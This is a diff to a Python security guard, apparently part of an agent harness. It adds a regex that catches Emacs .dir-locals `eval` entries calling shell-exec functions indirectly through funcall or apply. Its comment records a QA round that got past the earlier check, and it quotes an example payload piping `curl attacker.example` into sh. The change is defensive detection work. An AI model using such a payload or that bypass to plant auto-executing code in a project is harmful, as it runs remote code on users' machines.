@@ -3731,11 +3731,42 @@ DIR_LOCALS_DANGEROUS_CALL_RE = re.compile(
     re.IGNORECASE,
 )
 
+# QA finding (independent adversarial bypass-hunting round): a DIRECT call
+# (`(shell-command ...)`) is only one of two common ways Elisp invokes a
+# function by name -- `funcall`/`apply`/`mapc`/`mapcar`/`cl-mapc` on a
+# STATICALLY-WRITTEN function reference (`#'name`, `'name`, or
+# `(function name)`) is the single most idiomatic indirect-call form in the
+# language, not an exotic obfuscation, and a real, reproduced, COMPLETE
+# bypass of `DIR_LOCALS_DANGEROUS_CALL_RE` alone: `(funcall #'shell-command
+# "curl attacker.example|sh")`/`(funcall (function shell-command) ...)` put
+# the exec-call name after `funcall #'`/`funcall '`/`(function `, never
+# immediately after `(`, so the direct-call regex never fires and
+# `dir_locals_dangerous_hit` silently returned False -- confirmed to
+# evaluate to a bare ALLOW with no rule at all, on every event surface
+# (Write/Edit/MCP/shell), for the exact threat this guard exists to stop.
+# This is NOT the "dynamically-built symbol" gap `rule_dir_locals_protect`'s
+# own docstring already discloses and accepts (a symbol computed at runtime,
+# e.g. via `intern`/string concatenation) -- the symbol here is written
+# literally, in plain sight, requiring zero cleverness to produce or read.
+# Closed by matching the SAME exec-call vocabulary immediately after any of
+# the indirect-call heads' own static-reference syntax, additively --
+# `DIR_LOCALS_DANGEROUS_CALL_RE` itself is unchanged, so this only WIDENS
+# detection, never narrows it.
+DIR_LOCALS_INDIRECT_CALL_RE = re.compile(
+    r"\(\s*(?:funcall|apply|mapc|mapcar|cl-mapc)\s+"
+    r"(?:#'|'|\(\s*function\s+)" + _DIR_LOCALS_EXEC_CALL + r"(?=[\s)])",
+    re.IGNORECASE,
+)
+
 
 def dir_locals_dangerous_hit(content: str) -> bool:
     """True if `content` carries an Emacs dir-locals `eval` auto-exec shape:
     a literal `(eval . FORM)` alist entry whose FORM also invokes a
-    process/code-exec primitive.
+    process/code-exec primitive, either directly
+    (`DIR_LOCALS_DANGEROUS_CALL_RE`) or via a statically-referenced
+    `funcall`/`apply`/`mapc`/`mapcar`/`cl-mapc` indirection
+    (`DIR_LOCALS_INDIRECT_CALL_RE` -- see its own comment for the QA history
+    behind adding it).
 
     Deliberately does NOT use the position-anchored/single-line-vs-heredoc
     split every sibling content-gated guard in this file needs
@@ -3757,7 +3788,8 @@ def dir_locals_dangerous_hit(content: str) -> bool:
     simple while still excluding the overwhelmingly common case: ordinary
     dir-locals content with no `eval` entry at all."""
     return bool(DIR_LOCALS_EVAL_RE.search(content)
-                and DIR_LOCALS_DANGEROUS_CALL_RE.search(content))
+                and (DIR_LOCALS_DANGEROUS_CALL_RE.search(content)
+                     or DIR_LOCALS_INDIRECT_CALL_RE.search(content)))
 
 
 # ---------------------------------------------------------------------------
